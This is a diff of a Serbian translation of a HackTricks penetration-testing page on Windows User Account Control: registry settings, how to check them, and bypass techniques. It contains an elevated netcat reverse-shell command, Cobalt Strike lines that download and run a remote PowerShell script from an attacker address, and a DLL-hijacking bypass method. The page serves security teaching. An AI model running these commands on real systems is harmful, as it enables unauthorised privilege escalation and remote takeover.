@@ -1,63 +1,65 @@
-# UAC - User Account Control
+# UAC - Kontrola korisničkog naloga
+
+{% hint style="success" %}
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Podržite HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete tokove rada** pokretane najnaprednijim alatima zajednice na svetu.\
-Pristupite danas:
+Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) za lako kreiranje i **automatizaciju radnih tokova** uz pomoć najnaprednijih alata zajednice na svetu.\
+Pribavite pristup danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje za povišene aktivnosti**. Aplikacije imaju različite `integritetne` nivoe, a program sa **visokim nivoom** može obavljati zadatke koji **potencijalno mogu ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **se izvršavaju pod sigurnosnim kontekstom naloga koji nije administrator** osim ako administrator eksplicitno ne odobri tim aplikacijama/zadacima pristup nivou administratora da bi se izvršavali. To je funkcija koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.
+[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **izdavanje saglasnosti za uzdignute aktivnosti**. Aplikacije imaju različite `integrity` nivoe, a program sa **visokim nivoom** može izvoditi zadatke koji **mogu potencijalno ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **rade pod sigurnosnim kontekstom naloga koji nije administrator** osim ako administrator izričito ne odobri tim aplikacijama/zadacima pristup na nivou administratora za izvršavanje. To je funkcija pogodnosti koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.
 
 Za više informacija o nivoima integriteta:
 
 {% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
-[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
+[nivoi-integriteta.md](../windows-local-privilege-escalation/integrity-levels.md)
 {% endcontent-ref %}
 
-Kada je UAC na snazi, administratoru je dodeljeno 2 tokena: standardni korisnički ključ, za obavljanje redovnih radnji na običnom nivou, i jedan sa administratorskim privilegijama.
+Kada je UAC aktivan, korisniku administratoru se dodeljuju 2 tokena: standardni korisnički ključ, za obavljanje redovnih radnji na redovnom nivou, i jedan sa privilegijama administratora.
 
-Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno opisuje kako UAC funkcioniše i uključuje proces prijavljivanja, korisničko iskustvo i arhitekturu UAC-a. Administratori mogu koristiti sigurnosne politike da konfigurišu kako UAC funkcioniše specifično za njihovu organizaciju na lokalnom nivou (koristeći secpol.msc), ili konfigurisati i distribuirati putem Group Policy Objects (GPO) u okruženju Active Directory domena. Različite postavke su detaljno opisane [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoje 10 postavki Group Policy-ja koje se mogu postaviti za UAC. Sledeća tabela pruža dodatne detalje:
+Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i uključuje proces prijavljivanja, korisničko iskustvo i UAC arhitekturu. Administratori mogu koristiti sigurnosne politike za konfiguraciju načina na koji UAC funkcioniše specifično za njihovu organizaciju na lokalnom nivou (koristeći secpol.msc), ili konfigurisanjem i distribucijom putem objekata grupne politike (GPO) u okruženju Active Directory domena. Različite postavke su detaljno objašnjene [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 postavki grupne politike koje se mogu postaviti za UAC. Sledeća tabela pruža dodatne detalje:
 
-| Postavka Group Policy-ja                                                                                                                                                                                                                                                                                                                                                         | Registry ključ                | Podrazumevano podešavanje                                              |
+| Postavka grupne politike                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Podrazumevana postavka                                      |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Isključeno                                                     |
-| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Isključeno                                                     |
-| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Zahtev za odobrenje za ne-Windows binarne datoteke                  |
-| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Zahtev za akreditive na sigurnom desktopu                 |
-| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (podrazumevano za kućne korisnike) Isključeno (podrazumevano za preduzeća) |
-| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Isključeno                                                     |
-| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                      |
-| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                      |
-| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                      |
-| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                      |
-### Teorija UAC Bypass-a
+| [Kontrola korisničkog naloga: Mod odobrenja administratora za ugrađeni nalog administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Onemogućeno                                                 |
+| [Kontrola korisničkog naloga: Dozvoli UIAccess aplikacijama da traže uzdizanje bez korišćenja sigurnog radnog okruženja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Onemogućeno                                                 |
+| [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za administratore u modu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Traži saglasnost za ne-Windows binarne datoteke            |
+| [Kontrola korisničkog naloga: Ponašanje prompte za uzdizanje za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Traži kredencijale na sigurnom radnom okruženju            |
+| [Kontrola korisničkog naloga: Otkrivanje instalacija aplikacija i traženje uzdizanja](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (podrazumevano za kućne verzije) Onemogućeno (podrazumevano za preduzeća) |
+| [Kontrola korisničkog naloga: Samo uzdigni izvršne datoteke koje su potpisane i validirane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Onemogućeno                                                 |
+| [Kontrola korisničkog naloga: Samo uzdigni UIAccess aplikacije koje su instalirane na sigurnim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                  |
+| [Kontrola korisničkog naloga: Pokreni sve administratore u modu odobrenja administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                  |
+| [Kontrola korisničkog naloga: Prebaci se na sigurno radno okruženje kada se traži uzdizanje](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                  |
+| [Kontrola korisničkog naloga: Virtualizuj neuspehe pisanja datoteka i registra na lokacije po korisniku](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                  |
 
-Neke programe **automatski podižu** ako **korisnik pripada** grupi **administratora**. Ovi binarni fajlovi imaju unutar svog _**Manifesta**_ opciju _**autoElevate**_ sa vrednošću _**True**_. Binarni fajl takođe mora biti **potpisan od strane Microsoft-a**.
+### Teorija zaobilaženja UAC-a
 
-Zatim, da bi se **zaobišao** **UAC** (podigao sa **srednjeg** nivoa integriteta na **visoki**) neki napadači koriste ovakve binarne fajlove da bi **izvršili proizvoljni kod** jer će biti izvršen iz **procesa visokog nivoa integriteta**.
+Neki programi su **automatski uzdignuti** ako **korisnik pripada** **grupi administratora**. Ove binarne datoteke imaju unutar svojih _**Manifesta**_ opciju _**autoElevate**_ sa vrednošću _**True**_. Binarna datoteka takođe mora biti **potpisana od strane Microsoft-a**.
 
-Možete **proveriti** _**Manifest**_ binarnog fajla koristeći alat _**sigcheck.exe**_ iz Sysinternals-a. I možete **videti** nivo **integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals-a).
+Zatim, da bi se **zaobišao** **UAC** (uzdignuti sa **srednjeg** nivoa integriteta **na visoki**) neki napadači koriste ovu vrstu binarnih datoteka da **izvrše proizvoljni kod** jer će biti izvršen iz **procesa sa visokim nivoom integriteta**.
 
-### Provera UAC-a
+Možete **proveriti** _**Manifest**_ binarne datoteke koristeći alat _**sigcheck.exe**_ iz Sysinternals. I možete **videti** **nivo integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals).
 
-Da biste potvrdili da li je UAC omogućen uradite:
+### Proverite UAC
+
+Da potvrdite da li je UAC omogućen, uradite:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
@@ -73,24 +75,24 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-* Ako je **`0`** onda, UAC neće tražiti potvrdu (kao **isključeno**)
-* Ako je **`1`** administratoru se **traži korisničko ime i lozinka** da bi izvršio binarni fajl sa visokim privilegijama (na Secure Desktop-u)
-* Ako je **`2`** (**Uvek me obaveštavaj**) UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto sa visokim privilegijama (na Secure Desktop-u)
-* Ako je **`3`** kao `1` ali nije neophodno na Secure Desktop-u
-* Ako je **`4`** kao `2` ali nije neophodno na Secure Desktop-u
-* Ako je **`5`** (**podrazumevano**) tražiće potvrdu od administratora da pokrene ne-Windows binarne fajlove sa visokim privilegijama
+* Ako je **`0`**, UAC neće tražiti (kao **onemogućeno**)
+* Ako je **`1`**, administratoru se **traži korisničko ime i lozinka** da izvrši binarni fajl sa visokim pravima (na Secure Desktop)
+* Ako je **`2`** (**Uvek me obavesti**) UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto sa visokim privilegijama (na Secure Desktop)
+* Ako je **`3`**, kao `1`, ali nije neophodno na Secure Desktop
+* Ako je **`4`**, kao `2`, ali nije neophodno na Secure Desktop
+* Ako je **`5`**(**podrazumevano**), tražiće od administratora da potvrdi pokretanje ne-Windows binarnih fajlova sa visokim privilegijama
 
 Zatim, treba da pogledate vrednost **`LocalAccountTokenFilterPolicy`**\
-Ako je vrednost **`0`**, tada samo korisnik sa **RID 500** (**ugrađeni Administrator**) može obavljati **administratorske zadatke bez UAC-a**, a ako je `1`, **svi nalozi unutar grupe "Administratori"** to mogu uraditi.
+Ako je vrednost **`0`**, tada samo **RID 500** korisnik (**ugrađeni Administrator**) može da obavlja **admin zadatke bez UAC**, a ako je `1`, **svi nalozi unutar grupe "Administratori"** mogu to da rade.
 
-I, na kraju pogledajte vrednost ključa **`FilterAdministratorToken`**\
-Ako je **`0`** (podrazumevano), **ugrađeni administratorski nalog može** obavljati zadatke udaljene administracije, a ako je **`1`** ugrađeni administratorski nalog **ne može** obavljati zadatke udaljene administracije, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.
+I, konačno, pogledajte vrednost ključa **`FilterAdministratorToken`**\
+Ako je **`0`**(podrazumevano), **ugrađeni Administrator nalog može** da obavlja zadatke daljinske administracije, a ako je **`1`**, ugrađeni nalog Administrator **ne može** da obavlja zadatke daljinske administracije, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.
 
-#### Rezime
+#### Sažetak
 
-* Ako je `EnableLUA=0` ili **ne postoji**, **nema UAC-a za bilo koga**
-* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, Nema UAC-a za bilo koga**
-* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, Nema UAC-a za RID 500 (Ugrađeni Administrator)**
+* Ako je `EnableLUA=0` ili **ne postoji**, **nema UAC za nikoga**
+* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, Nema UAC za nikoga**
+* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, Nema UAC za RID 500 (Ugrađeni Administrator)**
 * Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=1`, UAC za sve**
 
 Sve ove informacije mogu se prikupiti koristeći **metasploit** modul: `post/windows/gather/win_privs`
@@ -103,16 +105,16 @@ whoami /groups | findstr Level
 ## UAC zaobilaženje
 
 {% hint style="info" %}
-Imajte na umu da ako imate grafički pristup žrtvi, UAC zaobilaženje je jednostavno jer jednostavno možete kliknuti na "Da" kada se pojavi UAC prozor.
+Imajte na umu da ako imate grafički pristup žrtvi, UAC zaobilaženje je jednostavno jer možete jednostavno kliknuti na "Da" kada se pojavi UAC promp.
 {% endhint %}
 
 UAC zaobilaženje je potrebno u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednje integriteta, a vaš korisnik pripada grupi administratora**.
 
-Važno je napomenuti da je **mnogo teže zaobići UAC ako je postavljen na najviši nivo sigurnosti (Uvek) nego ako je postavljen na bilo koji od drugih nivoa (Podrazumevano)**.
+Važno je napomenuti da je **mnogo teže zaobići UAC ako je na najvišem nivou sigurnosti (Uvek) nego ako je na bilo kojem od drugih nivoa (Podrazumevano).**
 
 ### UAC onemogućen
 
-Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverznu ljusku sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:
+Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**) možete **izvršiti obrnuti shell sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -123,12 +125,12 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 * [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 * [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Veoma** osnovno UAC "zaobilaženje" (potpisti pristup sistemu datoteka)
+### **Veoma** osnovno UAC "zaobilaženje" (potpun pristup sistemu datoteka)
 
-Ako imate shell sa korisnikom koji je unutar grupe Administratora, možete **montirati C$** deljeni putem SMB (sistem datoteka) lokalno na novi disk i imaćete **pristup svemu unutar sistema datoteka** (čak i folderu kuće Administratora).
+Ako imate shell sa korisnikom koji je unutar Administrators grupe, možete **montirati C$** deljenje putem SMB (sistem datoteka) lokalno na novom disku i imaćete **pristup svemu unutar sistema datoteka** (čak i Administratorovoj početnoj fascikli).
 
 {% hint style="warning" %}
-**Izgleda da ovaj trik više ne funkcioniše**
+**Izgleda da ova trik više ne funkcioniše**
 {% endhint %}
 ```bash
 net use Z: \\127.0.0.1\c$
@@ -137,9 +139,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### UAC zaobilaženje pomoću cobalt strike-a
+### UAC zaobilaženje sa Cobalt Strike
 
-Cobalt Strike tehnike će raditi samo ako UAC nije postavljen na maksimalni nivo bezbednosti
+Tehnike Cobalt Strike će raditi samo ako UAC nije postavljen na maksimalni nivo sigurnosti.
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -151,18 +153,18 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.
+**Empire** i **Metasploit** takođe imaju nekoliko modula za **obići** **UAC**.
 
 ### KRBUACBypass
 
 Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### UAC bypass eksploatacije
+### UAC bypass eksploati
 
-[**UACME**](https://github.com/hfiref0x/UACME) koji je **kompilacija** nekoliko UAC bypass eksploatacija. Imajte na umu da će vam biti potrebno **kompajlirati UACME pomoću visual studija ili msbuild-a**. Kompilacija će kreirati nekoliko izvršnih datoteka (kao što su `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete znati **koja vam je potrebna**.\
-Trebalo bi da **budete oprezni** jer će neki bypassi **pokrenuti neke druge programe** koji će **upozoriti** **korisnika** da se nešto dešava.
+[**UACME** ](https://github.com/hfiref0x/UACME)koji je **kompilacija** nekoliko UAC bypass eksploata. Imajte na umu da ćete morati da **kompajlirate UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (kao što je `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam je potreban.**\
+Trebalo bi da **budete oprezni** jer neki bypass-ovi mogu **izazvati neka druga programa** koja će **obavestiti** **korisnika** da se nešto dešava.
 
-UACME ima **verziju izgradnje od koje je svaka tehnika počela da radi**. Možete pretražiti tehniku koja utiče na vaše verzije:
+UACME ima **verziju iz koje je svaka tehnika počela da funkcioniše**. Možete pretraživati tehniku koja utiče na vaše verzije:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -170,44 +172,61 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-### Više UAC zaobilazaka
+Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.
 
-**Sve** tehnike korišćene ovde za zaobilaženje UAC **zahtevaju** potpunu interaktivnu ljusku sa žrtvom (obična nc.exe ljuska nije dovoljna).
+#### Više UAC zaobilaženja
 
-Možete dobiti korišćenjem **meterpreter** sesije. Migrirajte na **proces** koji ima vrednost **Session** jednaku **1**:
+**Sve** tehnike korišćene ovde za zaobilaženje AUC **zahtevaju** **potpunu interaktivnu ljusku** sa žrtvom (obična nc.exe ljuska nije dovoljna).
+
+Možete dobiti koristeći **meterpreter** sesiju. Migrirajte na **proces** koji ima **Session** vrednost jednaku **1**:
 
 ![](<../../.gitbook/assets/image (96).png>)
 
-(_explorer.exe_ bi trebalo da radi)
+(_explorer.exe_ bi trebao raditi)
 
 ### UAC zaobilaženje sa GUI
 
-Ako imate pristup **GUI možete jednostavno prihvatiti UAC prozor** kada se pojavi, zaista vam nije potreban zaobilazak. Dakle, pristup GUI-ju će vam omogućiti da zaobiđete UAC.
+Ako imate pristup **GUI, možete jednostavno prihvatiti UAC prompt** kada ga dobijete, zaobići ga zapravo ne morate. Dakle, pristup GUI će vam omogućiti da zaobiđete UAC.
 
-Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP-a) postoje **neki alati koji će se izvršavati kao administrator** odakle biste mogli **pokrenuti** na primer **cmd** kao admin direktno bez ponovnog dobijanja UAC upita kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **skrivenije**.
+Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP) postoje **neki alati koji će raditi kao administrator** odakle možete **pokrenuti** **cmd** na primer **kao admin** direktno bez ponovnog pozivanja od strane UAC kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo bi moglo biti malo više **neprimetno**.
 
-### Bučni brute-force UAC zaobilazak
+### Glasno brute-force UAC zaobilaženje
 
-Ako vam nije stalo do buke uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što **traži privilegije za podizanje dok korisnik ne prihvati**.
+Ako vam nije stalo do buke, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) koje **traži da se podignu dozvole dok korisnik ne prihvati**.
 
-### Vaš sopstveni zaobilazak - Osnovna metodologija zaobilaska UAC-a
+### Vaše vlastito zaobilaženje - Osnovna metodologija UAC zaobilaženja
 
-Ako pogledate **UACME** primetićete da **većina UAC zaobilazaka zloupotrebljava Dll Hijacking vulnerabilit**y (uglavnom pisanje zlonamernog dll-a na _C:\Windows\System32_). [Pročitajte ovo da biste naučili kako da pronađete Dll Hijacking vulnerabilitet](../windows-local-privilege-escalation/dll-hijacking.md).
+Ako pogledate **UACME**, primetićete da **većina UAC zaobilaženja zloupotrebljava Dll Hijacking ranjivost** (pretežno pisanje malicioznog dll na _C:\Windows\System32_). [Pročitajte ovo da biste naučili kako da pronađete Dll Hijacking ranjivost](../windows-local-privilege-escalation/dll-hijacking.md).
 
-1. Pronađite binarni fajl koji će se **autoelevate** (proverite da kada se izvrši radi na visokom nivou integriteta).
-2. Pomoću procmon-a pronađite "**NAME NOT FOUND**" događaje koji mogu biti ranjivi na **DLL Hijacking**.
-3. Verovatno ćete morati da **napišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32) gde nemate dozvole za pisanje. To možete zaobići koristeći:
-1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava izvlačenje sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava sa visokog nivoa integriteta).
-2. **IFileOperation**: Windows 10.
-4. Pripremite **skriptu** za kopiranje vašeg DLL-a unutar zaštićene putanje i izvršite ranjivi i autoelevated binarni fajl.
+1. Pronađite binarni fajl koji će **autoelevate** (proverite da kada se izvrši, radi na visokom integritetu).
+2. Sa procmon pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
+3. Verovatno ćete morati da **pišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32) gde nemate dozvole za pisanje. Ovo možete zaobići koristeći:
+   1. **wusa.exe**: Windows 7,8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava sa visokim integritetom).
+   2. **IFileOperation**: Windows 10.
+4. Pripremite **skriptu** da kopirate svoj DLL unutar zaštićene putanje i izvršite ranjivi i autoelevated binarni fajl.
 
-### Još jedna tehnika zaobilaska UAC-a
+### Još jedna tehnika zaobilaženja UAC
 
-Sastoji se u praćenju da li se **autoElevated binarni fajl** pokušava **čitati** iz **registra** ime/putanja **binarnog fajla** ili **komande** koja će biti **izvršena** (ovo je interesantnije ako binarni fajl traži ove informacije unutar **HKCU**).
+Sastoji se u praćenju da li **autoElevated binarni fajl** pokušava da **pročita** iz **registrija** **ime/putanju** **binarne** ili **komande** koja treba da bude **izvršena** (ovo je zanimljivije ako binarni fajl traži ove informacije unutar **HKCU**).
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete tokove rada** pokretane najnaprednijim alatima zajednice na svetu.\
-Pristupite danas:
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
